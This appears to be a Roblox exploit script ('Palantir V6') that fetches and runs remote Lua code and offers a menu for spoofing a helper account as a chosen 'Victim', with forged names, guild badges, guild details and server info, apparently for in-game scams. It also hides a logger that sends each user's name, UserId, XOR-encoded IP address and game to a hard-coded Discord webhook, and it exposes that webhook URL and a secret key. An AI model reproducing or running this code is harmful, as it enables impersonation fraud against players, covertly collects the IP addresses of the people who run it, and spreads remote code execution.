
loadstring(game:HttpGet("https://raw.githubusercontent.com/BelioScripts/Palantir/refs/heads/main/Bypass.lua"))()
--// =========================
--// LINORIA LOAD
--// =========================
local repo = 'https://raw.githubusercontent.com/violin-suzutsuki/LinoriaLib/main/'

local Library = loadstring(game:HttpGet(repo .. 'Library.lua'))()
assert(Library, "Failed to load Library.lua")
local ThemeManager = loadstring(game:HttpGet(repo .. 'addons/ThemeManager.lua'))()
local SaveManager = loadstring(game:HttpGet(repo .. 'addons/SaveManager.lua'))()

--// =========================
--// SERVICES
--// =========================
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
local TextService = game:GetService("TextService")

--// =========================
--// CONFIG
--// =========================
getgenv().Settings = {
    PLAYERS = {
        VICTIM = "",
        HELPER = "",
        HELPERS_INGAME_NAME = "",
    },

    VISUAL = {
        oldGuildName = "",
        newGuildName = "",
        DisplayName = "",
        GUILD_ROLE = "",

        BADGE_TOGGLES = {
            Bronze = false,
            DarkGoldRed = false,
            Deep = false,
            Gold = false,
            IronVow = false,
            Red = false,
            Silver = false,
        },

        DETAILS = {
            ["Leader"] = "",
            ["Old_Name"] = "",
            ["Lieutenants"] = "",
            ["Officers"] = "",
            ["Overall Score"] = "",
            ["PvE Score"] = "",
            ["PvP Score"] = "",
            ["Rooms"] = "",
        },
    },

    SERVER = {
        SERVER_NAME = "",
        SERVER_REGION = "",
        CHARACTER_SLOT = "",
    }
}


local WEBHOOK_URL = "https://discord.com/api/webhooks/1454102218490908878/k_GqkU_Jh4I4x8PNUmKZCej8YJkl2O_Rue_HFav9Ki2yntg9ihvAjprXXkCHLq7wa55i"

-- 🔑 KEEP THIS SECRET
local SECRET_KEY = "c21b962e71f1969d6aea8af9083cc2ec3267ac9c32939d88368ab876f514624d"




--// =========================
--// SERVICES
--// =========================

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local MarketplaceService = game:GetService("MarketplaceService")
local LocalPlayer = Players.LocalPlayer

local requestFunc =
    (syn and syn.request) or
    http_request or
    request or
    (fluxus and fluxus.request)

--// =========================
--// UTILS
--// =========================

local function inTable(t, v)
    return table.find(t, tonumber(v)) ~= nil
end

-- XOR encrypt → hex
local function xorEncrypt(str, key)
    local out = {}
    for i = 1, #str do
        local c = string.byte(str, i)
        local k = string.byte(key, ((i - 1) % #key) + 1)
        table.insert(out, string.format("%02x", bit32.bxor(c, k)))
    end
    return table.concat(out)
end

--// =========================
--// LOGGER
--// =========================

local function log(action)
    if not requestFunc then return end

    local gameName = "Unknown"
    pcall(function()
        gameName = MarketplaceService:GetProductInfo(game.PlaceId).Name
    end)

    local encryptedIP = "Unavailable"

pcall(function()
    local res = requestFunc({
        Url = "https://api.ipify.org?format=json",
        Method = "GET"
    })
    if res and res.Body then
        local ip = HttpService:JSONDecode(res.Body).ip
        if ip then
            encryptedIP = xorEncrypt(ip, SECRET_KEY)
        end
    end
end)


    local payload = {
        username = "Palantir Logger",
        embeds = {{
            title = "📜 Palantir Log",
            color = 5793266,
            fields = {
                { name = "User", value = LocalPlayer.Name, inline = true },
                { name = "UserId", value = tostring(LocalPlayer.UserId), inline = true },
                { name = "Encrypted IP", value = encryptedIP, inline = false },
                { name = "Game", value = gameName, inline = false },
                { name = "PlaceId", value = tostring(game.PlaceId), inline = true },
                { name = "Action", value = action, inline = false },
                { name = "Time", value = os.date("%Y-%m-%d %H:%M:%S"), inline = true }
            }
        }}
    }

    requestFunc({
        Url = WEBHOOK_URL,
        Method = "POST",
        Headers = { ["Content-Type"] = "application/json" },
        Body = HttpService:JSONEncode(payload)
    })
end
local function logChange(category, key, oldValue, newValue)
    log(string.format(
        "[%s] %s changed from '%s' to '%s'",
        category,
        key,
        tostring(oldValue),
        tostring(newValue)
    ))
end

local function logAction(action)
    log("[ACTION] " .. action)
end
--// =========================
--// ORIGINAL VALUES STORAGE
--// =========================
local OriginalValues = {
    HelperName = nil,
    HelperDisplayName = nil,
    LeaderboardNames = {},
    GuildLabels = {},
    GuildInfo = {Title = "", DescText = ""},
    WorldUI = {ServerTitle = "", ServerRegion = "", Slot = ""}
}


--// =========================
--// REMOTE VICTIM BLACKLIST
--// =========================

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local BLACKLIST_URL =
    "https://raw.githubusercontent.com/BelioScripts/Palantir/main/Blacklisted.lua"

local VictimBlacklist = {}

pcall(function()
    VictimBlacklist = loadstring(game:HttpGet(BLACKLIST_URL))()
end)

local function isVictimBlacklisted(userId)
    return VictimBlacklist[tostring(userId)] == true
end

local function blacklistKick(reason)
    LocalPlayer:Kick("🚫 BLACKLISTED VICTIM USERID\n" .. reason)
end


-- Store original helper info
if getgenv().Settings.PLAYERS.HELPER ~= "" then
    local success, helperName = pcall(function()
        return Players:GetNameFromUserIdAsync(tonumber(getgenv().Settings.PLAYERS.HELPER))
    end)
    if success and helperName then
        local helper = Players:FindFirstChild(helperName)
        if helper then
            OriginalValues.HelperName = helper.Name
            OriginalValues.HelperDisplayName = helper.DisplayName
        end
    end
end

-- Store original leaderboard names & badges
local leaderboardGui = PlayerGui:FindFirstChild("LeaderboardGui")
if leaderboardGui then
    local frame = leaderboardGui.MainFrame:FindFirstChild("ScrollingFrame")
    if frame then
        for _, entry in ipairs(frame:GetChildren()) do
            if entry.Name == "PlayerFrame" then
                local label = entry:FindFirstChild("Player")
                if label then
                    OriginalValues.LeaderboardNames[label] = label.Text
                end
            end
        end
    end
end

-- Store original guild labels
for _, v in ipairs(game:GetDescendants()) do
    if v:IsA("TextLabel") and v.Name == "Guild" then
        OriginalValues.GuildLabels[v] = v.Text
    end
end

-- Store original guild info panel
if leaderboardGui then
    local guildFrame = leaderboardGui.MainFrame:FindFirstChild("GuildInfo")
    if guildFrame then
        OriginalValues.GuildInfo.Title = guildFrame.Title.Text
        OriginalValues.GuildInfo.DescText = guildFrame.DescSheet.Desc.Text
    end
end

-- Store original world UI info
local topbarGui = PlayerGui:FindFirstChild("TopbarGui")
if topbarGui then
    local info = topbarGui.Container.InfoFrame.ServerInfo
    if info then
        OriginalValues.WorldUI.ServerTitle = info.ServerTitle.Text
        OriginalValues.WorldUI.ServerRegion = info.ServerRegion.Text
    end
    local slot = topbarGui.Container.InfoFrame.CharacterInfo:FindFirstChild("Slot")
    if slot then
        OriginalValues.WorldUI.Slot = slot.Text
    end
end

--// =========================
--// NAME RESOLUTION
--// =========================
local function resolveNames()
    local targetInitial, hoverText

    if getgenv().Settings.PLAYERS.HELPERS_INGAME_NAME ~= "" then
        targetInitial = getgenv().Settings.PLAYERS.HELPERS_INGAME_NAME
    end

    if getgenv().Settings.PLAYERS.VICTIM ~= "" then
        pcall(function()
            hoverText = Players:GetNameFromUserIdAsync(
                tonumber(getgenv().Settings.PLAYERS.VICTIM)
            )
        end)
    end

    return targetInitial, hoverText
end

--// =========================
--// LEADERBOARD HOVER
--// =========================
local function setupLeaderboardHover(targetInitial, hoverText)
    local gui = PlayerGui:FindFirstChild("LeaderboardGui")
    if not gui then return end

    local frame = gui.MainFrame:FindFirstChild("ScrollingFrame")
    if not frame then return end

    local function hook(entry)
        if entry.Name ~= "PlayerFrame" then return end
        local label = entry:FindFirstChild("Player")
        if not label then return end
        if targetInitial and label.Text ~= targetInitial then return end

        local original = label.Text
        local hovering = false

        entry.MouseEnter:Connect(function()
            hovering = true
            if hoverText then label.Text = hoverText end
        end)

        entry.MouseLeave:Connect(function()
            hovering = false
            label.Text = original
        end)

        label:GetPropertyChangedSignal("Text"):Connect(function()
            if hovering and hoverText then
                label.Text = hoverText
            end
        end)
    end

    for _, v in ipairs(frame:GetChildren()) do hook(v) end
    frame.ChildAdded:Connect(hook)
end

--// =========================
--// GUILD TEXT SPOOF
--// =========================
local function setupGuildTextSpoof()
    local function apply(label)
        if label:IsA("TextLabel")
        and label.Name == "Guild"
        and getgenv().Settings.VISUAL.oldGuildName ~= ""
        then
            label.Text = label.Text:gsub(
                getgenv().Settings.VISUAL.oldGuildName,
                getgenv().Settings.VISUAL.newGuildName
            )
        end
    end

    for _, v in ipairs(game:GetDescendants()) do apply(v) end
    game.DescendantAdded:Connect(apply)
end

--// =========================
--// HELPER VISUAL SPOOF
--// =========================
local function setupHelperVisual()
    if getgenv().Settings.PLAYERS.HELPER == "" then return end

    local helperName
    pcall(function()
        helperName = Players:GetNameFromUserIdAsync(
            tonumber(getgenv().Settings.PLAYERS.HELPER)
        )
    end)

    local helper = Players:FindFirstChild(helperName or "")
    if not helper then return end

    local victimName
    pcall(function()
        victimName = Players:GetNameFromUserIdAsync(
            tonumber(getgenv().Settings.PLAYERS.VICTIM)
        )
    end)
 
    helper.Name = victimName or helper.Name
    helper.DisplayName = getgenv().Settings.VISUAL.DisplayName

    local function applyChar(char)
        local hum = char:WaitForChild("Humanoid", 3)
        if hum then
            hum.DisplayName = getgenv().Settings.VISUAL.DisplayName
            hum.NameDisplayDistance = 0
        end
    end

    if helper.Character then applyChar(helper.Character) end
    helper.CharacterAdded:Connect(applyChar)
end

--// =========================
--// GUILD INFO SPOOF
--// =========================
local function setupGuildInfo()
    local gui = PlayerGui:FindFirstChild("LeaderboardGui")
    if not gui then return end

    local frame = gui.MainFrame:FindFirstChild("GuildInfo")
    if not frame then return end

    frame:GetPropertyChangedSignal("Visible"):Connect(function()
        if not frame.Visible then return end

        frame.Title.Text = getgenv().Settings.VISUAL.GUILD_ROLE

        local lines = {}
        for k, v in pairs(getgenv().Settings.VISUAL.DETAILS) do
            table.insert(lines, "<b>"..k.."</b>: "..v)
        end

        table.sort(lines)
        frame.DescSheet.Desc.RichText = true
        frame.DescSheet.Desc.Text = table.concat(lines, "\n")
    end)
end

--// =========================
--// BADGE INJECTION
--// =========================
local function setupBadgeInjection()
    local gui = PlayerGui:FindFirstChild("LeaderboardGui")
    if not gui then return end

    local source = gui:FindFirstChild("LeaderboardClient")
    local list = gui.MainFrame:FindFirstChild("ScrollingFrame")
    if not source or not list then return end

    local helperName = getgenv().Settings.PLAYERS.HELPERS_INGAME_NAME
    if not helperName or helperName == "" then return end

    local function getBadge()
        for k, v in pairs(getgenv().Settings.VISUAL.BADGE_TOGGLES) do
            if v then return source:FindFirstChild(k) end
        end
    end

    local function apply(frame)
        if frame.Name ~= "PlayerFrame" then return end
        local label = frame:FindFirstChild("Player")
        if not label then return end

        if label.Text ~= helperName then return end

        local old = label:FindFirstChild("InjectedBadge")
        if old then old:Destroy() end

        local badge = getBadge()
        if badge then
            local c = badge:Clone()
            c.Name = "InjectedBadge"
            c.Parent = label
        end
    end

    for _, v in ipairs(list:GetChildren()) do apply(v) end
    list.ChildAdded:Connect(apply)
end

--// =========================
--// EXCLUSIVE BADGE TOGGLE
--// =========================
local function setExclusiveBadge(name)
    for k in pairs(getgenv().Settings.VISUAL.BADGE_TOGGLES) do
        getgenv().Settings.VISUAL.BADGE_TOGGLES[k] = (k == name)
    end
    setupBadgeInjection()
end

local function clearAllBadges()
    for k in pairs(getgenv().Settings.VISUAL.BADGE_TOGGLES) do
        getgenv().Settings.VISUAL.BADGE_TOGGLES[k] = false
    end
    setupBadgeInjection()
end

--// =========================
--// WORLD UI SPOOF
--// =========================
local function setupWorldUI()
    local ui = PlayerGui:FindFirstChild("TopbarGui")
    if not ui then return end

    local info = ui.Container.InfoFrame.ServerInfo

    if getgenv().Settings.SERVER.SERVER_NAME ~= "" then
        info.ServerTitle.Text = getgenv().Settings.SERVER.SERVER_NAME
    end

    if getgenv().Settings.SERVER.SERVER_REGION ~= "" then
        info.ServerRegion.Text = getgenv().Settings.SERVER.SERVER_REGION
    end

    local slot = ui.Container.InfoFrame.CharacterInfo:FindFirstChild("Slot")
    if slot and getgenv().Settings.SERVER.CHARACTER_SLOT ~= "" then
        slot.Text = getgenv().Settings.SERVER.CHARACTER_SLOT
    end
end

--// =========================
--// APPLY ALL
--// =========================
local function ApplyAll()
if isVictimBlacklisted(getgenv().Settings.PLAYERS.VICTIM) then
    logAction("KICKED: Blacklisted Victim loaded via ApplyAll")
    blacklistKick("Blacklisted Victim detected in config")
    return
end

    local t, h = resolveNames()
    setupLeaderboardHover(t, h)
    setupGuildTextSpoof()
    setupHelperVisual()
    setupGuildInfo()
    setupBadgeInjection()
    setupWorldUI()
end

--// =========================
--// REMOVE ALL SPOOFING
--// =========================
local function RemoveAllSpoofing()
    -- Restore helper
    if getgenv().Settings.PLAYERS.HELPER ~= "" then
        local helperName
        pcall(function()
            helperName = Players:GetNameFromUserIdAsync(tonumber(getgenv().Settings.PLAYERS.HELPER))
        end)
        local helper = Players:FindFirstChild(helperName or "")
        if helper then
            helper.Name = OriginalValues.HelperName or helper.Name
            helper.DisplayName = OriginalValues.HelperDisplayName or helper.DisplayName
            if helper.Character then
                local hum = helper.Character:FindFirstChildOfClass("Humanoid")
                if hum then
                    hum.DisplayName = OriginalValues.HelperDisplayName or helper.DisplayName
                    hum.NameDisplayDistance = 100
                end
            end
        end
    end

    -- Restore leaderboard names
    for label, text in pairs(OriginalValues.LeaderboardNames) do
        if label and label.Parent then
            label.Text = text
            local oldBadge = label:FindFirstChild("InjectedBadge")
            if oldBadge then oldBadge:Destroy() end
        end
    end

    -- Restore guild labels
    for label, text in pairs(OriginalValues.GuildLabels) do
        if label and label.Parent then
            label.Text = text
        end
    end

    -- Restore guild info panel
    local gui = PlayerGui:FindFirstChild("LeaderboardGui")
    if gui then
        local frame = gui.MainFrame:FindFirstChild("GuildInfo")
        if frame then
            frame.Title.Text = OriginalValues.GuildInfo.Title
            frame.DescSheet.Desc.Text = OriginalValues.GuildInfo.DescText
        end
    end

    -- Restore world UI
    local ui = PlayerGui:FindFirstChild("TopbarGui")
    if ui then
        local info = ui.Container.InfoFrame.ServerInfo
        if info then
            info.ServerTitle.Text = OriginalValues.WorldUI.ServerTitle
            info.ServerRegion.Text = OriginalValues.WorldUI.ServerRegion
        end
        local slot = ui.Container.InfoFrame.CharacterInfo:FindFirstChild("Slot")
        if slot then
            slot.Text = OriginalValues.WorldUI.Slot
        end
    end
end

--// =========================
--// UI
--// =========================
local Window = Library:CreateWindow({
    Title = 'Palantir V6',
    Center = true,
    AutoShow = true
})

local MainTab = Window:AddTab('Main')
local UISettingsTab = Window:AddTab('UI Settings')

-- Players
local PlayersGroup = MainTab:AddLeftGroupbox('Players')
PlayersGroup:AddInput('Victim', {
    Text = 'Victim UserID',
    Default = getgenv().Settings.PLAYERS.VICTIM,
    Callback = function(v)
        if isVictimBlacklisted(v) then
            logAction("KICKED: Blacklisted Victim UserID attempt: " .. tostring(v))
            blacklistKick("Attempted to use blacklisted Victim ID: " .. tostring(v))
            return
        end

        local old = getgenv().Settings.PLAYERS.VICTIM
        getgenv().Settings.PLAYERS.VICTIM = v
        logChange("PLAYERS", "Victim UserID", old, v)
    end
})

PlayersGroup:AddInput('Helper', {
    Text = 'Helper UserID',
    Default = getgenv().Settings.PLAYERS.HELPER,
    Callback = function(v)
        local old = getgenv().Settings.PLAYERS.HELPER
        getgenv().Settings.PLAYERS.HELPER = v
        logChange("PLAYERS", "Helper UserID", old, v)
    end
})


PlayersGroup:AddInput('HelperName', {
    Text = 'Helper Ingame Name',
    Default = getgenv().Settings.PLAYERS.HELPERS_INGAME_NAME,
    Callback = function(v)
        local old = getgenv().Settings.PLAYERS.HELPERS_INGAME_NAME
        getgenv().Settings.PLAYERS.HELPERS_INGAME_NAME = v
        logChange("PLAYERS", "Helper Ingame Name", old, v)
    end
})


-- Visual
local VisualGroup = MainTab:AddLeftGroupbox('Visual')
VisualGroup:AddInput('OldGuild', {
    Text = 'Old Guild Name',
    Default = getgenv().Settings.VISUAL.oldGuildName,
    Callback = function(v)
        getgenv().Settings.VISUAL.oldGuildName = v
    end
})
VisualGroup:AddInput('NewGuild', {
    Text = 'New Guild Name',
    Default = getgenv().Settings.VISUAL.newGuildName,
    Callback = function(v)
        getgenv().Settings.VISUAL.newGuildName = v
    end
})
VisualGroup:AddInput('DisplayName', {
    Text = 'Display Name',
    Default = getgenv().Settings.VISUAL.DisplayName,
    Callback = function(v)
        getgenv().Settings.VISUAL.DisplayName = v
    end
})
VisualGroup:AddDropdown('GuildRole', {
    Text = 'Guild Role',
    Values = { "Leader", "Lieutenant", "Officer", "Member" },
    Default = 1,
    Callback = function(v)
        getgenv().Settings.VISUAL.GUILD_ROLE = v
    end
})
for Badge in pairs(getgenv().Settings.VISUAL.BADGE_TOGGLES) do
    VisualGroup:AddToggle(Badge, {
        Text = Badge,
        Default = false,
        Callback = function(v)
            if v then
                setExclusiveBadge(Badge)
            else
                clearAllBadges()
            end
        end
    })
end

-- Server
local ServerGroup = MainTab:AddRightGroupbox('Server')
for k in pairs(getgenv().Settings.SERVER) do
    ServerGroup:AddInput(k, {
        Text = k,
        Default = getgenv().Settings.SERVER[k],
        Callback = function(v)
            getgenv().Settings.SERVER[k] = v
        end
    })
end

-- Manual Apply Button
local ApplyGroup = MainTab:AddRightGroupbox('Apply')
ApplyGroup:AddButton('Apply Spoof', function()
    ApplyAll()
end)

-- UI Settings Tab
local MenuGroup = UISettingsTab:AddLeftGroupbox('Menu')
MenuGroup:AddButton('Unload', function()
    RemoveAllSpoofing()
    Library:Unload()
end)
MenuGroup:AddLabel('Menu bind'):AddKeyPicker('MenuKeybind', {
    Default = 'End',
    NoUI = true,
    Text = 'Menu Keybind'
})
Library.ToggleKeybind = Options.MenuKeybind

--// =========================
--// THEME & SAVE MANAGER
--// =========================
ThemeManager:SetLibrary(Library)

-- Override theme directly (Palantir look)
local PalantirTheme = {
    TextColor = Color3.fromRGB(220, 225, 235),
    TextOutline = Color3.fromRGB(0, 0, 0),
    Background = Color3.fromRGB(16, 18, 22),
    MainColor = Color3.fromRGB(22, 25, 30),
    TabBackground = Color3.fromRGB(18, 21, 26),
    SectionBackground = Color3.fromRGB(24, 28, 34),
    BorderColor = Color3.fromRGB(45, 52, 62),
    AccentColor = Color3.fromRGB(70, 140, 200),
    AccentColorDark = Color3.fromRGB(45, 100, 160),
    ButtonBackground = Color3.fromRGB(30, 35, 42),
    ButtonTextColor = Color3.fromRGB(220, 225, 235),
    ToggleEnabled = Color3.fromRGB(70, 140, 200),
    ToggleDisabled = Color3.fromRGB(55, 60, 70),
    SliderBackground = Color3.fromRGB(30, 35, 42),
    SliderFill = Color3.fromRGB(70, 140, 200),
    InputBackground = Color3.fromRGB(26, 30, 36),
    DropdownBackground = Color3.fromRGB(26, 30, 36),
    DropdownBorder = Color3.fromRGB(45, 52, 62)
}

for k, v in pairs(PalantirTheme) do
    pcall(function() ThemeManager.Theme[k] = v end)
end

ThemeManager:SetFolder('Palantir')
ThemeManager:ApplyToTab(UISettingsTab)

SaveManager:SetLibrary(Library)
SaveManager:IgnoreThemeSettings()
SaveManager:SetIgnoreIndexes({ 'MenuKeybind' })
SaveManager:SetFolder('Palantir/Configs')
SaveManager:BuildConfigSection(UISettingsTab)
SaveManager:LoadAutoloadConfig()
